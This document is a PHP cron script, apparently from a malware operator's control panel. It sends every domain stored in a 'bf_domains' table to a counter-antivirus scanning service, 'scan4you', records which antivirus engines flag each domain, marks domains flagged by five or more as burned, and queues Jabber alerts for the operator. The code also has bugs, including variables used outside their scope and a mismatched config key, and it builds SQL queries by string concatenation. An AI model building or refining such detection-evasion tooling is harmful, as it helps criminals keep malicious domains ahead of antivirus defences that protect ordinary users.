#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '128M');

function real_path($p){
    $r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    if(empty($r)){
        mkdir(str_replace('//', '/', str_replace('\\', '/', $p)));
        $r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
    }
    return $r;
}

$dir = array();
$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['site'] = real_path($dir['script'] . '/../../');

ini_set('error_log', $dir['site'] . 'cache/domains_errors_php.txt');

function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8) file_put_contents($dir['site'] . 'cache/domains_errors_php.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

$pid_file = 'cache/domains.pid';

if(file_exists($dir['site'] . $pid_file)){
    if(IDOS === 'WIN'){
        $pid = file_get_contents($dir['site'] . $pid_file);
        if(stripos(exec('tasklist /FI "'.WIN_LOCALIZE_PID.' eq '.$pid.'"'), $pid) === false){
            file_put_contents($dir['site'] . $pid_file, getmypid());
        }else{
            exit;
        }
    }else{
        $pid = file_get_contents($dir['site'] . $pid_file);
        if(stripos(exec('ps -p '.$pid), $pid) === false){
            file_put_contents($dir['site'] . $pid_file, getmypid());
        }else{
            exit;
        }
    }
}else{
    file_put_contents($dir['site'] . $pid_file, getmypid());
}

include_once($dir['site'] . '/includes/functions.av.php');

$cfg = json_decode(file_get_contents($dir['site'] . '/cache/config.json'), true);

if(empty($cfg['d_scan4you_id']) || empty($cfg['d_scan4you_token'])) exit;

include_once($dir['site'] . 'includes/functions.get_config.php');
$cfg_db = get_config();

require_once($dir['site'] . 'classes/mysqli.class.php');
$mysqli = new mysqli_db();
$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

function curl_load($host, $in = 0){
    global $cfg;
    
    if($in < 3){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_VERBOSE, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
	curl_setopt($ch, CURLOPT_URL, $cfg['scan4u']);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, array('id'=>$cfg['d_scan4you_id'],'token'=>$cfg['d_scan4you_token'],'action'=>'domain','domain'=>$host,'frmt'=>'json'));
	
	$return = curl_exec($ch);
	
	if(curl_getinfo($ch,CURLINFO_HTTP_CODE) == 200){
	    if(preg_match('~\{(.*)\}~is', $return)){
		return $return;
	    }else{
		sleep(60);
		return curl_load($host, ($in+1));
	    }
	}else{
	    sleep(30);
	    return curl_load($host, ($in+1));
	}
    }else{
	return false;
    }
}

function load_domains($row){
    global $mysqli;
    
    $not_check = true;
    
    if(gethostbyname($row->host) != $row->host){
        $not_check = false;
    }else{
        if(preg_match("~([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})~", $row->host)) $not_check = false;
    }
    
    if($not_check == false){
        $check = curl_load(trim($row->host));
        
        if($check !=false){
            $check = json_decode($check, 1);
            if(count($check) > 0){            
                $av = '';
                $avt = '';
                $avc = 0;
                $avcf = 0;
                foreach($check as $key => $item){
                    $avc++;
                    if($item != 'OK'){
                        $av .= av_replace($key) . '|';
                        $avt .= av_replace($key) . '('.$item.')|';
                        $avcf++;
                    }
                }
                
                if($row->answer == 1){
                    if(!empty($cfg['jabber']['d_tracking'])){
                        $text = 'Domain: ' . $row->host . "\r\n";
                        $text .= 'Comment: ' . $row->comment . "\r\n";
                        $text .= 'AV Detect: ' . $avcf . "\r\n";
			$text .= 'AV All: ' . $avc . "\r\n";
                        $text .= "AV Detect List: \r\n\r\n" . str_replace('|', "\r\n ", ' ' . $av);
                        
                        if(strpos($cfg['jabber']['d_tracking'], ',') != false){
                            $jt = explode(',', $cfg['jabber']['bt_tracking']);
                            if($jt > 0){
                                foreach($jt as $jab){
                                    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
                                }
                            }
                        }else{
                            @file_put_contents($dir['site'] . 'cache/jabber/to_' . $cfg['jabber']['d_tracking'] . '_' . mt_rand(5, 15) . time(), $text);
                        }
                    }
                }
                
                if($avcf >= 5){
                    $mysqli->query('update bf_domains set status = \'2\', av = \''.$av.'\', avt = \''.$avt.'\', avc = \''.$avc.'\', avcf = \''.$avcf.'\', up_date = CURRENT_TIMESTAMP() WHERE (id = \''.$row->id.'\') LIMIT 1');
                }else{
                    $mysqli->query('update bf_domains set status = \'1\', av = \''.$av.'\', avt = \''.$avt.'\', avc = \''.$avc.'\', avcf = \''.$avcf.'\', up_date = CURRENT_TIMESTAMP() WHERE (id = \''.$row->id.'\') LIMIT 1');
                }
            }
        }
    }else{
        $mysqli->query('update bf_domains set status = \'2\', up_date = CURRENT_TIMESTAMP() WHERE (id = \''.$row->id.'\') LIMIT 1');
    }
}

//$mysqli->query('SELECT id, host FROM bf_domains WHERE (answer = \'0\')', null, 'load_domains');
$mysqli->query('SELECT id, host, comment FROM bf_domains', null, 'load_domains');

sleep(10);

unlink($dir['site'] . $pid_file);

?>